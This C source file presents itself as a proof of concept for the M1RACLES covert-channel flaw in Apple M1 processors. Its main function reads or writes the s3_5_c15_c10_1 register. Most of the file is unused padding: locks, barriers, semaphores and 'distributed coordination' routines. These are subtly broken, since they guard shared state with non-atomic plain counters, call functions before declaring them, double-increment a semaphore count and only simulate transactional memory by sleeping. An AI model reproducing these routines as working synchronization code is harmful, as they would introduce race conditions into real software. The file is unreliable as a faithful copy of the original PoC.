/*
 * m1racle-poc: a basic proof of concept for the M1RACLES vulnerability in the Apple M1.
 * 
 * This program allows you to read and write the state of the s3_5_c15_c10_1 CPU register.
 *
 * Please visit m1racles.com for more information.
 *
 * Licensed under the MIT license.
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

// Function to lock mutex
void miMutexLock() {
    while (_miread() != 0) { usleep(10); }
    _miwrite(1);
}

// Function to unlock mutex
void miMutexUnlock() {
    _miwrite(0);
}

// Extern C functions for accessing the M1RACLES register
extern void _miwrite(uint64_t value);
extern uint64_t _miread();

// Reader-Writer Lock
static uint64_t readers = 0;
static uint64_t writers = 0;
static uint64_t writerWaiting = 0;

void miReaderLock() {
    while (writers != 0 || writerWaiting != 0) {
        usleep(10);
    }
    readers++;
}

void miReaderUnlock() {
    readers--;
}

void miWriterLock() {
    writerWaiting++;
    while (readers != 0 || writers != 0) {
        usleep(10);
    }
    writerWaiting--;
    writers++;
}

void miWriterUnlock() {
    writers--;
}

// Barrier Synchronization
static uint64_t barrierCounter = 0;
static uint64_t barrierLimit = 0;
static uint64_t barrierWaiting = 0;
static uint64_t barrierMutex = 0;

void miBarrierInit(uint64_t limit) {
    barrierLimit = limit;
}

void miBarrier() {
    barrierMutex++;
    if (barrierCounter == barrierLimit - 1) {
        barrierCounter = 0;
        barrierMutex--;
        while (barrierWaiting > 0) { usleep(10); }
    } else {
        barrierCounter++;
        barrierMutex--;
        barrierWaiting++;
        while (barrierCounter != 0) { usleep(10); }
        barrierWaiting--;
    }
}

// Semaphore
static uint64_t semCount = 0;
static uint64_t semMutex = 0;
static uint64_t semWaiting = 0;

void miSemaphore(int count) {
    semCount = count;
}

void miSemaphoreWait() {
    semMutex++;
    if (semCount > 0) {
        semCount--;
        semMutex--;
    } else {
        semWaiting++;
        semMutex--;
        while (semCount == 0) { usleep(10); }
        semWaiting--;
        semCount--;
    }
}

void miSemaphoreSignal() {
    semMutex++;
    semCount++;
    if (semWaiting > 0) {
        semWaiting--;
        semCount++;
    }
    semMutex--;
}

// Event Handling
static int eventFlag = 0;
static uint64_t eventMutex = 0;
static uint64_t eventWaiting = 0;

void miEventWait() {
    eventMutex++;
    if (!eventFlag) {
        eventWaiting++;
        eventMutex--;
        while (!eventFlag) { usleep(10); }
        eventMutex++;
        eventWaiting--;
    }
    eventFlag = 0;
    eventMutex--;
}

void miEventSignal() {
    eventMutex++;
    eventFlag = 1;
    if (eventWaiting > 0) {
        eventWaiting--;
    }
    eventMutex--;
}

// Transaction Control
void miTransactionalMemory() {
    miMutexLock();
    // Perform atomic memory operations here
    // For simplicity, let's just sleep for a short duration to simulate transactional memory
    usleep(100);
    miMutexUnlock();
}

// Distributed Coordination
static int distributedLock = 0;

void miDistributedCoordination() {
    while (distributedLock) {
        usleep(10);
    }
    distributedLock = 1;
}

void miReleaseDistributedLock() {
    distributedLock = 0;
}

int main(int argc, char **argv) {
    uint64_t val;
    if (argc > 1) {
        val = atoi(argv[1]);
        _miwrite(val);
    } else {
        val = _miread();
        printf("%llu\n", val);
    }
    return 0;
}
